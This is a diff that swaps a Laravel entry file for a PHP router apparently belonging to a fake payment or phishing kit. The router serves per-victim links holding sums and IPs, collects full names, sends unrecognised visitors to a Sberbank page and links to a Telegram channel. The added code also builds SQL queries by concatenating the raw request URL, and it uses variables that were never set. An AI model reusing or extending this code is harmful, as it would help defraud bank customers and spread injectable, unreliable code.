@@ -1,62 +1,78 @@
 <?php
+define("access", "yes");
+require_once 'admin/connection.php';
+require_once $_SERVER["DOCUMENT_ROOT"] .'/config.php';
+
+
+$url =  $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+$test = explode('/',$link);
+
+$getPage = R::load('settings', '1');
+$acces = $getPage->landing_work;
 
 
 
-/**
- * Laravel - A PHP Framework For Web Artisans
- *
- * @package  Laravel
- * @author   Taylor Otwell <taylor@laravel.com>
- */
 
-define('LARAVEL_START', microtime(true));
+$idPerson = generateRandomString();
 
-/*
-|--------------------------------------------------------------------------
-| Register The Auto Loader
-|--------------------------------------------------------------------------
-|
-| Composer provides a convenient, automatically generated class loader for
-| our application. We just need to utilize it! We'll simply require it
-| into the script here so that we don't have to worry about manual
-| loading any of our classes later on. It feels great to relax.
-|
-*/
+//redirectAfterPay
+$mysite = "https://www.google.com";
 
-require __DIR__.'/vendor/autoload.php';
+//активация полей (0-выкл\ 1вкл) https://t.me/slivmenss
+$fio = 1; // Фамилия имя
+$email = 0; // имейлы
 
-/*
-|--------------------------------------------------------------------------
-| Turn On The Lights
-|--------------------------------------------------------------------------
-|
-| We need to illuminate PHP development, so let us turn on the lights.
-| This bootstraps the framework and gets it ready for use, then it
-| will load up this application so that we can run it and send
-| the responses back to the browser and delight our users.
-|
-*/
+if ($fio && $email) {$res = 1;}
+else if (!$fio && $email) {	$res = 2;}	
+else if ($fio && !$email) {	$res = 3;}
 
-$app = require_once __DIR__.'/bootstrap/app.php';
+if (strlen($value) > 3){
+	$value = substr($value, 0, -3). " " .substr($value, -3);
+}
 
-/*
-|--------------------------------------------------------------------------
-| Run The Application
-|--------------------------------------------------------------------------
-|
-| Once we have the application, we can handle the incoming request
-| through the kernel, and send the associated response back to
-| the client's browser allowing them to enjoy the creative
-| and wonderful application we have prepared for them.
-|
-*/
 
-$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);
 
-$response = $kernel->handle(
-    $request = Illuminate\Http\Request::capture()
-);
+function generateRandomString($length = 10) {
+    $characters = '0123456789';
+    $charactersLength = strlen($characters);
+    $randomString = '';
+    for ($i = 0; $i < $length; $i++) {
+        $randomString .= $characters[rand(0, $charactersLength - 1)];
+    }
+    return $randomString;
+}
 
-$response->send();
 
-$kernel->terminate($request, $response);
+$labirint = R::getAll( 'SELECT * FROM `path` WHERE `link` = "'.$url.'"');
+$labirintCheck = count(R::getAll( 'SELECT * FROM `path` WHERE `link` = "'.$url.'"'));
+
+if($acces){
+
+
+    $PATH = R::getAll( 'SELECT * FROM `path`')[0];
+    $itr = $PATH['x'];
+    $ref =  $PATH['method'];
+    $IP =   $PATH['ip'];
+    $value = $PATH['sum'];
+    $fraudCheckOn = intval($PATH['bc']);
+
+
+
+	require 'main.php';
+}
+elseif ($labirintCheck) {
+
+    $PATH = $labirint[0];
+    $itr = $PATH['x'];
+    $ref =  $PATH['method'];
+    $IP =   $PATH['ip'];
+    $value = $PATH['sum'];
+    $fraudCheckOn = intval($PATH['bc']);
+    require 'main.php';
+}
+
+
+else{
+	echo "<script>window.location.replace('https://www.sberbank.ru/404.php');</script>";
+}
+?>
